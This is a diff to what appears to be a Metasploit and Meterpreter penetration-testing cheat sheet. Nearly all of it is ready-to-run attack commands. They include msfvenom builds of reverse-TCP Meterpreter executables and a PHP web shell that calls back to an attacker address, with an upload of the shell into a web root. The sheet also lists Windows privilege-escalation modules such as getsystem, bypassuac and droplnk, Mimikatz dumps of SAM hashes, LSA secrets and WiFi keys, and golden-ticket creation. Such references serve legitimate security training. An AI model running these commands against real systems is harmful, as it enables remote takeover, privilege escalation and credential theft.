@@ -86,7 +86,10 @@ This particular exploit will drop you into a meterpreter session running at NT A
 
 # Generate payloads
 
-msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>
+msfvenom -h                                                 Show help
+msfvenom --list <archs, encoders, formats, platforms>       Show supported options
+
+msfvenom -p <payload variable=value> -f <format> -e <encoder> -a <arch> --platform <OS platform> -o <output file>
 
 - Generate a bind payload that avoids a bad character
 msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
@@ -98,10 +101,10 @@ msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
 msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
 
 - Generate a reverse payload and save it as an executable
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 —platform windows -o /root/evil64.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 --platform windows -o /root/evil64.exe
 
 - Generate PHP web shell and upload to a web server
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -a php -e php/base64 -f raw -o /root/webshell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f raw -a php -e php/base64 -o /root/webshell.php
 upload /root/webshell.php /var/www/
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -156,50 +159,71 @@ webcam_snap                                                 Takes a picture from
 
 sysinfo                                                     Gets information about the remote system, such as OS
 getuid                                                      Get the user that the server is running as
-ps                                                          Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
+ps                                                          List running processes
+                                                            Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
 migrate <PID>                                               Migrate to that process using its PID
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege escalation - Windows
 
 - Option 1
-use priv                                                    Attempt to elevate to NT AUTHORITY\SYSTEM
-getsystem                                                   Will use a number of different techniques to attempt to gain SYSTEM level
-                                                              privileges on the remote system
+use priv                                                    Load the priv extensions
+getprivs                                                    Attempt to enable all privileges available to the current process
+getsystem                                                   Use a number of different techniques to attempt to gain SYSTEM level privileges
+getuid                                                      Check to see if priv esc worked
 background                                                  If this fails, background the current session and try other options
+use exploit/windows/local/                                  Show available Windows local exploits
 
 - Option 2
-use post/multi/recon/local_exploit_suggester
-set SESSION 1
+use post/windows/escalate/getsystem
+set session 1
 run
 
 - Option 3
-use post/windows/escalate/getsystem
-set SESSION 1
+use post/multi/recon/local_exploit_suggester
+set session 1
 run
-
-getuid
-getsystem
-getuid                                                      Privileges should now be NT AUTHORITY\SYSTEM
 
 - Option 4
 use post/windows/escalate/droplnk
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444                                               This MUST be a different port from what was used in the original exploit
+set session 1
+set payload windows/meterpreter/reverse_tcp
+set lhost <attacker IP>
+set lport 444                                               This MUST be a different port from what was used in the original exploit
 exploit
+getuid                                                      Check to see if priv esc worked
 
 - Option 5
 use exploit/windows/local/bypassuac
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 444
+set session 1
+set payload windows/meterpreter/reverse_tcp
+set lhost <attacker IP>
+set lport 444                                               This MUST be a different port from what was used in the original exploit
 exploit
+getuid                                                      Check to see if priv esc worked
 
-- Option 6
-use exploit/windows/local/                                  Currently 89 options - 6/30/20
+- Option x
+use exploit/windows/local/service_permissions
+
+- Option x
+use exploit/windows/local/trusted_service_path
+
+- Option x
+use exploit/windows/local/ppr_flatten_rec
+
+- Option x
+use exploit/windows/local/ms_ndproxy
+
+- Option x
+use post/windows/escalate/ms10_073_kbdlayout
+set session 1
+run
+
+- Option x
+use post/windows/escalate/unmarshal_cmd_exec                Creates a new user account, example username = EpLACMszKRJJh, password = whfzxba
+set session 1
+run
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Windows enumeration
@@ -221,11 +245,11 @@ run post/windows/gather/credentials/gpp
 
 # Mimikatz
 
-load kiwi                                                    Load Mimikatz
-help kiwi                                                    Show help
+load kiwi                                                   Load Mimikatz
+help kiwi                                                   Show help
 
-lsa_dump_sam                                                 Dump LSA SAM
-lsa_dump_secrets                                             Dump LSA secrets
+lsa_dump_sam                                                Dump LSA SAM
+lsa_dump_secrets                                            Dump LSA secrets
 
 password_change -u <user> -p <old password> -P <new password>
 
@@ -236,9 +260,9 @@ golden_ticket_create -d <domain> -u <user> -s <SID> -k
 kerberos_ticket_use /root/<domain>
 shell
 
-creds_all                                                    Dump hashes and credentials
+creds_all                                                   Dump hashes and credentials
 
-wifi_list                                                    Dump WiFi names and shared keys
+wifi_list                                                   Dump WiFi names and shared keys
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Steal tokens
@@ -459,4 +483,3 @@ services -c port,protocol,name                              Show specific column
 services -p 22                                              Search for hosts with a specific port open
 services -p 22 --rhosts                                     Search for hosts with a specific port open, and add those hosts to rhosts
 services -s http                                            Search for hosts with a specific service running
-
